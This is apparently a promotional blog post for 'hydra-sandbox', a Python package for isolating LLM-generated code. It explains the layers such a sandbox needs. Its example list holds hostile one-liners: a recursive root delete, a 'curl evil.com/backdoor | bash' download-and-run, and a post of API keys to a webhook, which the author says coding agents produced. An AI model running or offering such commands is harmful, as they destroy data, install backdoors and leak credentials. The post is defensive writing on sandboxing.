# Why LLM-Generated Code Is a Security Nightmare

Every LLM agent framework executes model-generated Python code.
LangChain does it. LlamaIndex does it. CrewAI does it. And almost all of
them do it with `exec()` or bare `subprocess.run()` — zero isolation,
zero sandboxing, zero defense.

Here's why that's terrifying.

## The hallucination problem is a security problem

Everyone knows LLMs hallucinate. But when a coding agent hallucinates, it
doesn't just produce wrong output — it produces *dangerous code*.

I've seen Claude and GPT-4o generate:

- `import subprocess; subprocess.run(['rm', '-rf', '/'])`
- `import os; os.system('curl evil.com/backdoor | bash')`
- `import requests; requests.post(webhook, json=api_keys)`
- Infinite `while True: pass` loops that saturate CPU
- `[0] * 10_000_000_000` memory bombs

None of these are malicious. The model isn't *trying* to attack you. It
just pattern-matched a solution that happens to be dangerous when
executed in your environment.

## The state of the art is exec()

The most popular LangChain Python REPL tool runs code like this:

```python
exec(code)  # in the SAME process as your agent
```

No timeout. No import filtering. No network blocking. No secret purging.
If the model generates `os.system(...)`, that runs with the same
permissions as your agent process — which probably has access to your
API keys, database credentials, and filesystem.

This isn't a LangChain problem. Every framework has the same gap. The
Python ecosystem simply lacks a good, lightweight sandbox that doesn't
require Docker, Firecracker, or a cloud service.

## What "safe execution" actually requires

Running untrusted Python safely isn't one thing — it's layers:

1. **Import guard** — block dangerous stdlib modules before they load
2. **Network isolation** — prevent socket creation
3. **Environment sanitization** — purge API keys from child env
4. **Resource limits** — CPU, memory, file descriptors
5. **Output truncation** — cap stdout/stderr before it floods context
6. **Timeout** — kill runaway processes
7. **Filesystem isolation** — restrict read/write to a temp directory
8. **Syscall filtering** — kernel-level block on fork/exec/socket

Most tools implement maybe #6. A few add #1 (by parsing imports with
regex — trivially bypassable). Almost none implement #7-8.

## Enter hydra-sandbox

I built an open-source package that implements all eight layers:

```python
from hydra_sandbox import execute_python

result = execute_python(llm_output, timeout=5, strategy="auto")
```

That's it. One function call. The subprocess strategy (cross-platform)
handles layers 1-6. On Linux, `strategy="seccomp+landlock"` adds 7-8.

The import guard doesn't regex-parse your code — it installs a
`sys.meta_path` finder that intercepts every import at the Python
runtime level. `__import__('subprocess')`, `importlib.import_module`,
`compile()` + `exec()` chains — all caught.

## The cost of safety

Overhead vs raw `subprocess.run`: +10-18ms for the subprocess strategy,
+30-50ms for seccomp+landlock.

That's less than a single LLM API call. For any production agent that
makes multiple LLM roundtrips per task, the sandbox overhead is
completely invisible.

## What's next

If you're building LLM tools, please stop using bare `exec()`. It's not
a question of if a model will generate dangerous code — it's when. Your
users deserve better than "trust the model."

hydra-sandbox is MIT-licensed, zero required dependencies, and works on
Linux, macOS, and Windows. pip install hydra-sandbox.

[Link to GitHub repo]
